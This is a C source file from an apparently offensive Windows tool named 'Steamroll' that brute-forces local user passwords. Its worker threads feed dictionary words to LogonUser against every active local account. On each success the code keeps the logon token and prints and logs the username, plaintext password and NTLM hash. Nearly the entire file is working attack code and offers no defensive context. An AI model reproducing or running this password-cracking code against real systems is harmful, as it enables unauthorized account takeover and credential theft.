#include "stdafx.h"

static VOID __forceinline SecondsToTimeString(_In_ double totalSeconds, _Out_writes_(nTimeSize) LPSTR szTime, _In_ size_t nTimeSize)
{
	int seconds = (int)totalSeconds % 60;
	int minutes = (int)(totalSeconds / 60) % 60;
	int hours = (int)totalSeconds / 3600;

	sprintf_s(szTime, nTimeSize, "%dh %dm %ds", hours, minutes, seconds);
}

_Success_(return == EXIT_SUCCESS) static DWORD CALLBACK ProgressWorkerThread(_Inout_ LPVOID lpParam)
{
	PSTEAMROLL_THREAD_DATA lpThreadData;
	PCRACK_SET lpCrackSet;
	double percent = 0.0f; 
	DWORD dwBytesProcessed;
	char szElapsed[MAX_PATH], szRemaining[MAX_PATH];
	time_t startTime, currentTime;
	BOOL bFlag = TRUE;
	double seconds, remaining;

	lpThreadData = (PSTEAMROLL_THREAD_DATA)lpParam;
	lpCrackSet = (PCRACK_SET)&lpThreadData->crackset;

	time(&startTime);
	
	while (bFlag)
	{
		dwBytesProcessed = ((char*)lpCrackSet->dictionary.lpCurrentAddress - (char*)lpCrackSet->dictionary.lpStartAddress);
		percent = (double)((double)dwBytesProcessed / (double)lpCrackSet->dictionary.dwBytes) * 100.0f;

		/* rounding errors */
		if (percent >= 99.995f)
		{
			bFlag = FALSE;
			percent = 100.0f;
		}
		time(&currentTime);
		seconds = difftime(currentTime, startTime);
		remaining = (seconds / dwBytesProcessed) * (lpCrackSet->dictionary.dwBytes - dwBytesProcessed);
		SecondsToTimeString(seconds, szElapsed, MAX_PATH);
		SecondsToTimeString(remaining, szRemaining, MAX_PATH);

		printf("\r#: %d (%.2f%%) %s\tRemaining: %s\t", lpCrackSet->dwPasswordAttempts, percent, szElapsed, szRemaining);

		Sleep(50);
	}

	return EXIT_SUCCESS;
}

_Success_(return == EXIT_SUCCESS) static DWORD CALLBACK CrackWorkerThread(_Inout_ LPVOID lpParam)
{
	PSTEAMROLL_THREAD_DATA lpThreadData;
	TCHAR szPassword[MAX_PATH];
	TCHAR szNtlmHash[NTLM_BUFFER_SIZE];
	WCHAR szOutput[MAX_PATH];
	PNET_USER pEntry;
	HANDLE hToken;
	PCRACK_SET lpCrackSet;

	lpThreadData = (PSTEAMROLL_THREAD_DATA)lpParam;
	lpCrackSet = (PCRACK_SET)&lpThreadData->crackset;

	for (;;)
	{
		if (!GetNextCrackSet(lpCrackSet, NULL, szPassword, MAX_PATH))
			return EXIT_SUCCESS;

		NET_USER_LOOP(pEntry, lpCrackSet->lpUserList)
		{
			if (pEntry->bActive == FALSE)
				continue;

			if (LogonUser(pEntry->szUser, _T("."), szPassword, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken))
			{
				pEntry->hToken = hToken;
				pEntry->bActive = FALSE;
				--lpCrackSet->dwUnsolved;
				NtlmHash(szPassword, szNtlmHash, NTLM_BUFFER_SIZE);
				wsprintf(szOutput, L"\r[+] USER: %ls\tPW: %ls\tNTLM: %ls\t\n\n", pEntry->szUser, szPassword, szNtlmHash);
				wprintf(L"%s", szOutput);

				if (lpThreadData->options.szOutput != NULL && _tcscmp(lpThreadData->options.szOutput, STEAMROLL_DEFAULT_OUTPUT) != 0)
					WriteLineFileW(lpThreadData->options.szOutput, szOutput);
			}
		}

	}
}

BOOL __fastcall ScheduleThreads(_In_ PSTEAMROLL_THREAD_DATA lpThreadData)
{
	HANDLE *hThreadArray = NULL;
	PSTEAMROLL_OPTIONS options;
	int i;

	options = &lpThreadData->options;

	if ((hThreadArray = malloc(sizeof(HANDLE) * options->nThreads)) == NULL)
		return FALSE;

	for (i = 0; i < options->nThreads; ++i)
	{
		/* todo: look into escalating thread security privileges */
		hThreadArray[i] = CreateThread(NULL, 0, CrackWorkerThread, lpThreadData, 0, NULL);
		if (hThreadArray[i] == NULL)
			break;
	}

	if (options->bVerbose)
		CreateThread(NULL, 0, ProgressWorkerThread, lpThreadData, 0, NULL);

	WaitForMultipleObjects(options->nThreads, hThreadArray, TRUE, INFINITE);

	free(hThreadArray);

	return TRUE;
}
